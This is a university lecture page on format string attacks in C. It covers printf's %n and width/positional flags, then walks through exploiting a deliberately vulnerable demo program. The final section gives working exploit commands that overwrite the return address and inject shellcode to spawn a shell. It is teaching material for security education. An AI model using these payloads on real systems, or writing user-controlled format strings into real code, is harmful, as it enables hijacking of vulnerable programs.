@@ -1,0 +1,652 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-11-11 Wed 15:00 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 19: Format String Attacks 1</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 19: Format String Attacks 1</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline1">1. Format String Attacks</a></li>
+<li><a href="#orgheadline5">2. Uncommon Formats and Format Options</a>
+<ul>
+<li><a href="#orgheadline2">2.1. %n : Saving the Number of Bytes</a></li>
+<li><a href="#orgheadline3">2.2. Format Flag and Argument Options</a></li>
+<li><a href="#orgheadline4">2.3. Flag Options for Strings</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline6">3. Using formats in an exploit</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-2">
+<h2 id="orgheadline1"><span class="section-number-2">1</span> Format String Attacks</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+A format string attack is an alternate form of exploiting
+programming that doesn't necessarily require smashing the
+stack. Instead, it leverages the format characters in a format string
+to generate excessive data, read from arbitrary memory, or write to
+arbitrary memory.
+</p>
+
+<p>
+At the heart of a format string attack is a casual programming error
+regarding format strings that allows the user to provide the format
+string portion, not just the arguments to the format. For example:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  printf(argv[1]); <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">user controls the format</span>
+  printf(<span style="color: #ffa07a;">"\n"</span>);
+}
+</pre>
+</div>
+
+<p>
+In this program, the user provides the format portion of the
+<code>printf()</code>. When we run this, for most of the common things, it
+doesn't matter:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./format_error "Hello World"
+Hello World
+user@si485H-base:demo$ ./format_error "Go Navy"
+Go Navy
+user@si485H-base:demo$ ./format_error "%x"
+b7fff000
+</pre>
+
+<p>
+However, notice what happens when you give a format character, i.e.,
+one that starts with a '%.' The format character is interpreted and
+the output is an address, an address on the stack, more
+precisely. What if I were to give it something longer? What if we
+were to give it something that would cause a memory address to be
+dereferenced, like a '%s' :
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./format_error "%s.%s.%s.%s.%s.%s.%s"
+4.??u?.UW1?VS???????unull).(null).?$?U?
+user@si485H-base:demo$ ./format_error "%s.%s.%s.%s.%s.%s.%s.%s"
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+We can actually get the program to crash, and from we've seen so
+far, getting the program to crash is usually the first step towards
+exploiting the program, which is what we'll eventually do.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-2">
+<h2 id="orgheadline5"><span class="section-number-2">2</span> Uncommon Formats and Format Options</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+In order to full leverage the power of the format, we need to review
+the full list of formats and format options. You should refer to the
+manual page for all the details <code>man 3 printf</code>.
+</p>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">2.1</span> %n : Saving the Number of Bytes</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+Format printing services allows you to save the total bytes formatted
+into a variable. There is a decent chance you've never heard of this
+format, but it actually is surprisingly useful for certain tasks. For
+example, given a format and its arugments, it is not obvious how to
+determine how long the output is until it actually formatted. 
+</p>
+
+<p>
+Here's a basic example, of using <code>%n</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">count_one</span>, <span style="color: #eedd82;">count_two</span>;
+
+  printf(<span style="color: #ffa07a;">"The number of bytes written up to this point X%n is being stored in count_one, "</span>
+         <span style="color: #ffa07a;">"and the number of bytes up to here X%n is being stored in count_two.\n"</span>,
+         &amp;count_one,&amp;count_two);
+
+  printf(<span style="color: #ffa07a;">"count_one: %d\n"</span>, count_one);
+  printf(<span style="color: #ffa07a;">"count_two: %d\n"</span>, count_two);
+
+  <span style="color: #00ffff;">return</span> 0;
+}
+</pre>
+</div>
+<p>
+The <code>%n</code> format matches to an address, in paticular an address of an
+integer, at which the number of bytes formatted up to that point are
+stored. So, for example, running this program, we get:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./format_n 
+The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.
+count_one: 46
+count_two: 113
+</pre>
+<p>
+Note that the <code>%n</code> character is not actually produced in the output:
+it is not printable. Instead, it only has a side effect. 
+</p>
+
+<p>
+Ok, so why does this format exist? Well, there are some really
+practical uses, for example, consider counting the digits of a number
+read in using <code>scanf()</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c">user@si485H-base:demo$ cat scanf_n.c
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> main(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">a</span>,<span style="color: #eedd82;">n</span>;
+
+  scanf(<span style="color: #ffa07a;">"%d%n"</span>,&amp;a,&amp;n);
+
+  printf(<span style="color: #ffa07a;">"Number: %d Digits: %d\n"</span>,a,n);
+
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ ./scanf_n 
+1234567890
+Number: 1234567890 Digits: 10
+</pre>
+<p>
+Or for example, to do text align &#x2026; there are a lot of reasonable
+reasons to have this format.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">2.2</span> Format Flag and Argument Options</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+Another tool of formats we will need is some of the extra options for
+formats to better manipulate the format output. So far you are fairly
+familiar with the conversion formats:
+</p>
+<ul class="org-ul">
+<li><code>%d</code> : signed number</li>
+<li><code>%u</code> : unsigned number</li>
+<li><code>%x</code> : hexadecimal number</li>
+<li><code>%f</code> : floating point number</li>
+<li><code>%s</code> : string conversion</li>
+</ul>
+
+<p>
+What you might not be aware is there is a wealth more options to
+change the formatting. Here's a sample program that will illuminate
+some of these, so called "flag" options:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">x</span> = 0xdeadbeef;
+
+  printf(<span style="color: #ffa07a;">"%%d:(%d)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%u:(%u)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%x:(%x)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%#x:(%#x)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%#50x:(%#50x)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%#050x:(%#050x)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%1$#050x %%1$d:(%1$#050x %1$d)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%#050x:(%#050x)\n"</span>,x);
+  printf(<span style="color: #ffa07a;">"%%1$#050x %%1$d:(%1$#050x %1$d)\n"</span>,x);
+
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ ./unusual_formats 
+%d:(-559038737)
+%u:(3735928559)
+%x:(deadbeef)
+%#x:(0xdeadbeef)
+%#50x:(                                        0xdeadbeef)
+%#050x:(0x0000000000000000000000000000000000000000deadbeef)
+%1$#050x %1$d:(0x0000000000000000000000000000000000000000deadbeef -559038737)
+%1$#050hx %1$hd:(0x00000000000000000000000000000000000000000000beef -16657)
+%1$#050hhx %1$hd:(0x0000000000000000000000000000000000000000000000ef -17)
+</pre>
+
+<p>
+The first flag option is the "#" which is used to add prefix
+formatting. In the case of printing in hexadecimal it will add '0x' to
+the start of non-zero values. That's pretty useful. 
+</p>
+
+<p>
+The next option is adding a number prior to the conversion argument,
+as in <code>%#50x</code>. This conversion will <i>right adjust</i> the format such
+that the entirety of the number takes up 50 hex digits. If you were to
+add a leading 0 to the adjustment, as in <code>%#050x</code>, the format will
+fill those blank spaces with 0's.
+</p>
+
+<p>
+Perhaps the least familiar option you've seen is the <code>m$</code> format where
+<code>m</code> is some number, allows you to refer to a specific argument being
+passed. In the example above, we refer to the same argument twice
+using two different conversion formats to follow. This is really
+useful to not have to pass the same argument multiple times; however,
+when you use the <code>$</code> references, you have to do for <i>all</i> the format
+arguments.
+</p>
+
+<p>
+Finally, we have the half-conversion option <code>h</code> which says to only
+convert half the typical size. In this case, since we are working with
+4-byte integer values, that would mean to format a 2-byte short size
+value when using one <code>h</code>, or a single char length 1-byte value with
+two, <code>hh</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-3">
+<h3 id="orgheadline4"><span class="section-number-3">2.3</span> Flag Options for Strings</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+With strings, things are similar but a bit different. Here's some
+example code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">string</span> = <span style="color: #ffa07a;">"Go Navy! Beat Army!"</span>;
+
+  printf(<span style="color: #ffa07a;">"%%s:(%s)\n"</span>,string);
+  printf(<span style="color: #ffa07a;">"%%50s:(%50s)\n"</span>,string);
+  printf(<span style="color: #ffa07a;">"%%.5s:(%.5s)\n"</span>,string);
+  printf(<span style="color: #ffa07a;">"%%50.5s:(%50.5s)\n"</span>,string);
+  printf(<span style="color: #ffa07a;">"%%-50.5s:(%-50.5s)\n"</span>,string);
+
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ ./string_formats 
+%s:(Go Navy! Beat Army!)
+%50s:(                               Go Navy! Beat Army!)
+%.5s:(Go Na)
+%50.5s:(                                             Go Na)
+%-50.5s:(Go Na                                             )
+</pre>
+
+<p>
+Like with numbers, we can specify a length flag to right adjust the
+string up to some specified size, but we can't fill in that with
+0's. Instead the space is filled with spaces. 
+</p>
+
+<p>
+Unlike with integer numbers (but can be done with float numbers) we
+can also truncate the length of the format if we use the <code>.</code>
+option. The number following the <code>.</code> says how many bytes from the
+string should be used, and this can be combined with the right
+adjustment. And, interestingly, the right adjustment can be flipped to
+left adjustment with a negative sign.
+</p>
+
+<p>
+While this is all on the output side and you can imagine where it
+might be super useful, from a security perspective of overflow
+protection, the right adjustment becomes a limiter to how many bytes
+can be written to the target address:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">string</span>[10];
+
+  scanf(<span style="color: #ffa07a;">"%10s"</span>,string);
+
+  printf(<span style="color: #ffa07a;">"%s\n"</span>,string);
+
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ ./scanf_format 
+HELLLOOOOOOOOOOOOOOO
+HELLLOOOOO
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-2">
+<h2 id="orgheadline6"><span class="section-number-2">3</span> Using formats in an exploit</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Now that we've had a whirl-wind tour of formats you've never heard of
+nor ever really wanted to use, how can we use them in an
+exploit. We'll look at one method in this lesson involving stack smashing, but we'll see some other techniques soon. 
+</p>
+
+<p>
+Here's the program we are going to exploit:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">good</span>(){
+  printf(<span style="color: #ffa07a;">"good\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(){
+  printf(<span style="color: #ffa07a;">"bad\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">str</span>){
+
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">outbuf</span>[512];
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buffer</span>[512];
+
+  sprintf (buffer, <span style="color: #ffa07a;">"ERR Wrong command: %.400s"</span>, str);
+  sprintf (outbuf, buffer); <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">&lt;--- used as a silly copy</span>
+
+  printf(<span style="color: #ffa07a;">"outbuf: %s\n"</span>, outbuf);
+
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  vuln(argv[1]);
+
+}
+</pre>
+</div>
+
+<p>
+This is a rather contrived example of using <code>sprintf()</code> to do a
+copy. You might think because in the first <code>sprintf()</code> the <code>%.400s</code>
+format is used, this would not enable a overflow of <code>buffer</code> or
+<code>outbuff</code>. For example, this does not cause a segmentation fault:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./format_overflow `python -c "print 'A'*1000"`
+outbuf: ERR Wrong command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</pre>
+<p>
+True, we can't overflow <code>buffer</code>, but we can overflow <code>outbuff</code>
+because <code>buffer</code> is treated as the format character. For example, what
+if the input was like:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./format_overflow "%550x"
+outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               bffff897
+Segmentation fault (core dumped)
+</pre>
+<p>
+And if we look at the <code>dmesg</code> output:
+</p>
+<pre class="example">
+user@si485H-base:demo$ dmesg | tail -1
+[181031.140058] format_overflow[16736]: segfault at 20202020 ip 20202020 sp bffff6b0 error 14
+</pre>
+<p>
+We see that we overwrote the instruction pointer with a bunch of 0x20
+bytes, or spaces! Now, the goal is to overwrite the return address
+with something useful, like the address of <code>bad()</code>.
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d format_overflow | grep bad
+08048481 &lt;bad&gt;:
+</pre>
+
+<p>
+To do this, we need to do the right number of extended format to hit
+the return address, We can do this by first using 0xdeadbeef and
+checking the <code>dmesg</code> output:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./format_overflow "%500d$(printf '\xef\xbe\xad\xde')" &gt; /dev/null ; dmesg | tail -1
+Segmentation fault (core dumped)
+[181507.663004] format_overflow[16817]: segfault at deadbe ip 08048504 sp bffff6b0 error 4 in format_overflow[8048000+1000]
+user@si485H-base:demo$ ./format_overflow "%501d$(printf '\xef\xbe\xad\xde')" &gt; /dev/null ; dmesg | tail -1
+Illegal instruction (core dumped)
+[181507.663004] format_overflow[16817]: segfault at deadbe ip 08048504 sp bffff6b0 error 4 in format_overflow[8048000+1000]
+user@si485H-base:demo$ ./format_overflow "%502d$(printf '\xef\xbe\xad\xde')" &gt; /dev/null ; dmesg | tail -1
+Segmentation fault (core dumped)
+[181516.038682] format_overflow[16827]: segfault at 80400de ip 080400de sp bffff6b0 error 14 in format_overflow[8048000+1000]
+user@si485H-base:demo$ ./format_overflow "%503d$(printf '\xef\xbe\xad\xde')" &gt; /dev/null ; dmesg | tail -1
+Segmentation fault (core dumped)
+[181519.371290] format_overflow[16832]: segfault at 800dead ip 0800dead sp bffff6b0 error 14 in format_overflow[8048000+1000]
+user@si485H-base:demo$ ./format_overflow "%504d$(printf '\xef\xbe\xad\xde')" &gt; /dev/null ; dmesg | tail -1
+Segmentation fault (core dumped)
+[181522.598268] format_overflow[16837]: segfault at deadbe ip 00deadbe sp bffff6b0 error 14 in format_overflow[8048000+1000]
+user@si485H-base:demo$ ./format_overflow "%505d$(printf '\xef\xbe\xad\xde')" &gt; /dev/null ; dmesg | tail -1
+Segmentation fault (core dumped)
+[181526.367333] format_overflow[16842]: segfault at deadbeef ip deadbeef sp bffff6b0 error 15
+</pre>
+<p>
+So if we use a 505 byte length %d format, the next 4-bytes we write is
+the return address. And adding that, we get what we want:
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d format_overflow | grep bad
+08048481 &lt;bad&gt;:
+user@si485H-base:demo$ ./format_overflow "%505d$(printf '\x81\x84\x04\x08')" 
+outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               -1073743725??
+bad
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+We can also get this to execute a shell in the normal way (note how I
+adjusted the jump point using dmesg).
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./format_overflow "%505d$(printf '\xef\xbe\xad\xde')$(printf $(./hexify.sh smallest_shell))"
+outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               -1073743746ﾭ?1???Phn/shh//bi??
+                                                                                                                                                                         ̀
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[181798.445440] format_overflow[16919]: segfault at deadbeef ip deadbeef sp bffff690 error 15
+user@si485H-base:demo$ ./format_overflow "%505d$(printf '\x90\xf6\xff\xbf')$(printf $(./hexify.sh smallest_shell))"
+outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               -1073743746????1???Phn/shh//bi??
+                                                                                                                                                                           ̀
+$ echo "I did it!"
+I did it!
+$
+</pre>
+</div>
+</div>
+</div>
+</body>
+</html>
